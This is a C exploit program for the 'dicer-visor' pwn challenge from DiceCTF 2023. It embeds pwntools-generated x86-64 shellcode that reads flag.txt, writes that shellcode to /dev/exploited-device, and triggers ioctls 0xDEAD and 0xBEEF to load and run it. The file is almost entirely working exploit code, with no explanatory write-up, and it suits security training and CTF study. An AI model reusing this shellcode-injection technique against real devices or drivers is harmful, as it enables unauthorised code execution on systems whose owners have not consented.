/*
compile
 gcc -static run_shell.c -o run_shell      
*/

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <string.h>

/*
generated using pwntools
>>> from pwn import *

>>> context.binary= ELF('/dicectf-2023-challenges/pwn/dicer-visor/challenge/dicer-visor')
[*] '/home/worker/i/ctf/2023/dicectf-2023-challenges/pwn/dicer-visor/challenge/dicer-visor'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
>>> a = asm(pwnlib.shellcraft.linux.cat("flag.txt"))
>>> ''.join([f"\\x{c:02x}" for c in a ])
'\\x6a\\x01\\xfe\\x0c\\x24\\x48\\xb8\\x66\\x6c\\x61\\x67\\x2e\\x74\\x78\\x74\\x50\\x6a\\x02\\x58\\x48\\x89\\xe7\\x31\\xf6\\x0f\\x05\\x41\\xba\\xff\\xff\\xff\\x7f\\x48\\x89\\xc6\\x6a\\x28\\x58\\x6a\\x01\\x5f\\x99\\x0f\\x05'
*/
const unsigned char shellcode[] = "\x6a\x01\xfe\x0c\x24\x48\xb8\x66\x6c\x61\x67\x2e\x74\x78\x74\x50\x6a\x02\x58\x48\x89\xe7\x31\xf6\x0f\x05\x41\xba\xff\xff\xff\x7f\x48\x89\xc6\x6a\x28\x58\x6a\x01\x5f\x99\x0f\x05";

size_t shell_len = strlen(shellcode);

int main(){

	FILE *fp;

	printf("[+] Open the device\n"); 
	fp = open("/dev/exploited-device", O_RDWR);

	if (fp == NULL){
		perror("Failed to open the dev");
		exit(-1);
	}

	printf("[+] write shellcode\n");

	size_t ret_len = write(fp, shellcode, shell_len);

	if (ret_len != shell_len) {
		fprintf(stderr, "[-] incomplete write original = %d, ret = %d\n", shell_len, ret_len);
		perror("write");
		exit(-1);
	}

	printf("[+] ioctl 0xDEAD\n");
	if (ioctl(fp, 0XDEAD) == -1) {
		perror("Shellcode write ioctl");
		exit(-1);
	}

	printf("[+] ioctls 0xBEEF\n");
	if(ioctl(fp, 0xBEEF) == -1){
		perror("shellcode execute ioctl");
		exit(-1);
	}
  return 0;
}
